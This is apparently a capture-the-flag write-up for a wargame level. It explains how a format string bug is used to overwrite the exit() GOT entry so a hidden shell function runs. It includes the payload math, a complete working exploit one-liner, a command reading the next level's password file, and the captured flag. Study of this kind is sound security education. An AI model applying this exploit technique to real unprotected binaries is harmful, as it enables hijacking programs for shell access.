# 🎯 Level5 - GOT Overwrite via Format String

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Hijacking function calls through the Global Offset Table! 🎯

## 📋 Binary Analysis

### 🎯 Key Functions (Decompiled)

```c
void o(void)
{
  system("/bin/sh");            // 🎯 Hidden shell function!
  _exit(1);
}

void n(void)
{
  char buffer[512];
  
  fgets(buffer, 512, stdin);    // 0x200 = 512
  printf(buffer);               // ⚠️ FORMAT STRING VULNERABILITY!
  exit(1);                      // ⚠️ NEW: Exits immediately!
}
```

### 🔑 Key Addresses (from Ghidra)

**Function `o()` at address `0x080484a4`:**
```asm
080484a4 <o>:
 80484a4:  push   ebp
 80484a5:  mov    ebp,esp
 80484a7:  sub    esp,0x18
 80484aa:  mov    DWORD PTR [esp],0x80485f0    ; "/bin/sh"
 80484b1:  call   8048360 <system@plt>
 80484b6:  mov    DWORD PTR [esp],0x1
 80484bd:  call   80483a0 <_exit@plt>
```

**GOT Entry for `exit@GLIBC_2.0` at address `0x08049838`:**
```asm
08049838 <exit@got.plt>
```

**Key Observation:** 
- `o()` exists but is **never called** in the code
- `n()` has format string bug but calls `exit(1)` immediately
- We can't interact with a shell normally because the program terminates

## 🚨 The Challenge

We have a format string vulnerability, but the program calls `exit(1)` immediately after `printf()`.

**The Problem:**
```c
printf(buffer);    // We control this (format string bug)
exit(1);          // But this kills the program!
```

Even if we write to memory, the program exits before we can spawn and interact with a shell.

**The Solution:** 
Overwrite the GOT (Global Offset Table) entry for `exit()` to point to `o()` instead!

When the program tries to exit, it will actually call `o()` → `system("/bin/sh")` 🎉

## 🎯 How the Exploit Works

### What is the GOT (Global Offset Table)?

**Purpose**: Dynamic linking - connects your program to shared library functions.

When you call a library function like `exit(1)`:

```
Your Code: exit(1);
     ↓
PLT (Procedure Linkage Table) stub at 0x080483d0
     ↓
Reads address from GOT at 0x08049838: "Where is exit()?"
     ↓
Jumps to the address stored in GOT (initially 0x0804a014, resolved to libc at runtime)
     ↓
Executes the actual exit() function in libc
```

**Critical Fact**: In older binaries (without RELRO), the GOT is **writable**!

We can modify GOT entries to redirect function calls.

### Visual: Normal vs Hijacked Flow

```
NORMAL EXECUTION:
════════════════════════════════════════════════
n() calls exit(1)
    ↓
PLT stub for exit at 0x080483d0
    ↓
Reads address from exit@GOT (0x08049838)
    │
    └─→ Contains: 0x0804a014 (initial value from Ghidra, resolves to libc at runtime)
    ↓
Jumps to libc exit function
    ↓
Program terminates ❌


HIJACKED EXECUTION (After GOT Overwrite):
════════════════════════════════════════════════
n() calls exit(1)
    ↓
PLT stub for exit at 0x080483d0
    ↓
Reads address from exit@GOT (0x08049838)
    │
    └─→ Contains: 0x080484a4 (address of o) ✅ [WE WROTE THIS!]
    ↓
Jumps to 0x080484a4 (our o() function)
    ↓
o() executes: system("/bin/sh")
    ↓
Shell spawned! 🎉
```

### The Attack Strategy

**Step 1: Identify Targets**
- Hidden function: `o()` at `0x080484a4`
- GOT entry to hijack: `exit@GOT` at `0x08049838`

**Step 2: Format String Write**
- **Target**: Write `0x080484a4` to address `0x08049838`
- **Challenge**: Large value (134,513,828 in decimal)
- **Solution**: Multi-word write with `%hn` (like level4)

**Step 3: Breaking Down the Value**

```
Target value: 0x080484a4

┌─────────────────┬─────────────────┐
│  Upper 2 bytes  │  Lower 2 bytes  │
│     0x0804      │     0x84a4      │
│   (2,052 dec)   │  (33,956 dec)   │
└─────────────────┴─────────────────┘

Memory addresses:
├─ 0x08049838 (exit@GOT)     ← Write 0x84a4 here
└─ 0x0804983a (exit@GOT + 2) ← Write 0x0804 here
```

**Step 4: Ascending Order Requirement**

Format string byte counters can only increase!

```
❌ Wrong: Write 33,956 then 2,052 (can't go backwards!)
✅ Right: Write 2,052 then 33,956 (ascending order)
```

So we write:
1. First: `0x0804` (2,052) to `0x0804983a`
2. Then: `0x84a4` (33,956) to `0x08049838`

Result: The full 4-byte value `0x080484a4` is assembled!

### The Math Breakdown

**Stack Discovery:**
```bash
Input: "AAAA" + "%x."*20
Output: AAAA200.b7fd1ac0.b7ff37d0.41414141...
                                  ^^^^^^^^
                              Position 4!
```

**Payload Structure:**
```python
[\x3a\x98\x04\x08][\x38\x98\x04\x08][%2044x][%4$hn][%31904x][%5$hn]
       │                  │            │       │        │        │
       │                  │            │       │        │        └─ Write to pos 5
       │                  │            │       │        └─ Print 31,904 more bytes
       │                  │            │       └─ Write 2,052 to pos 4
       │                  │            └─ Print 2,044 bytes (8+2044 = 2,052 total)
       │                  └─ 0x08049838 (exit@GOT) → goes to position 5
       └─ 0x0804983a (exit@GOT+2) → goes to position 4
```

**Calculation:**
1. **Addresses**: 8 bytes total (4 + 4)
2. **First write**: Need 2,052 total bytes
   - Already have: 8 bytes (addresses)
   - Need to print: 2,044 more → `%2044x`
   - Total: 2,052 bytes ✅
3. **Second write**: Need 33,956 total bytes
   - Already have: 2,052 bytes
   - Need to print: 31,904 more → `%31904x`
   - Total: 33,956 bytes ✅

### Complete Execution Flow

```
Step 1: Stack Setup
───────────────────
Stack Position 4: 0x0804983a (exit@GOT + 2)
Stack Position 5: 0x08049838 (exit@GOT)


Step 2: printf() Processing
────────────────────────────
Input: "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"

Action 1: Print addresses       → 8 bytes printed
Action 2: Process %2044x        → 2,044 more (2,052 total)
          └─ Prints stack value in 2,044-char width
Action 3: Process %4$hn         → Write 2,052 to position 4
          └─ Position 4 = 0x0804983a (GOT+2)
Action 4: Process %31904x       → 31,904 more (33,956 total)
          └─ Prints stack value in 31,904-char width
Action 5: Process %5$hn         → Write 33,956 to position 5
          └─ Position 5 = 0x08049838 (GOT)


Step 3: GOT State
─────────────────
exit@GOT (0x08049838):
  Before: 0x0804a014 (initial Ghidra value, resolves to libc at runtime)
  After:  0x080484a4 ✅
          ├─ Byte 0-1: 0x84a4 (written to 0x08049838)
          └─ Byte 2-3: 0x0804 (written to 0x0804983a)


Step 4: exit(1) Called
──────────────────────
Program executes: exit(1);
    ↓
PLT stub: Reads exit@GOT (0x08049838)
    ↓
Gets value: 0x080484a4 (address of o, not libc exit!)
    ↓
Jumps to: o() function
    ↓
o() executes: system("/bin/sh")
    ↓
Shell spawned! 🎉
```

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Format string bug** | ✅ | `printf(buffer)` in `n()` lets us write anywhere |
| **Stack control** | ✅ | Our input appears at stack position 4 |
| **Writable GOT** | ✅ | No RELRO protection (old binary) |
| **Known addresses** | ✅ | o() at 0x080484a4, exit@GOT at 0x08049838 |
| **Target function exists** | ✅ | o() spawns shell with system() |
| **%hn support** | ✅ | printf supports 2-byte writes |

### Key Insight

**Target Evolution:**
- **Level3/4**: Overwrote **DATA** (global variable `m`)
- **Level5**: Overwrote **CODE POINTER** (function address in GOT)

This is more powerful - we can hijack **any library function call**! Instead of just changing data values, we redirect the program's execution flow by modifying where functions point to.

## 💣 Execute the Exploit

```bash
(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x%4$hn%31904x%5$hn"'; cat) | ./level5
```

Get the flag:
```bash
cat /home/user/level6/.pass
```

---

> 💡 **Pro Tip**: GOT overwrites work on any dynamically linked function - `printf()`, `strlen()`, `free()`, `malloc()`, etc. You can redirect any library call to any function you want!

> ⚠️ **Security Note**: Modern binaries use [RELRO (Relocation Read-Only)](https://en.wikipedia.org/wiki/Hardening_(computing)) protection:
> - **Partial RELRO**: GOT is reordered but still writable (allows lazy binding)
> - **Full RELRO**: GOT is made read-only after program load (prevents this attack entirely)
> 
> Check with: `checksec --file=binary`

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
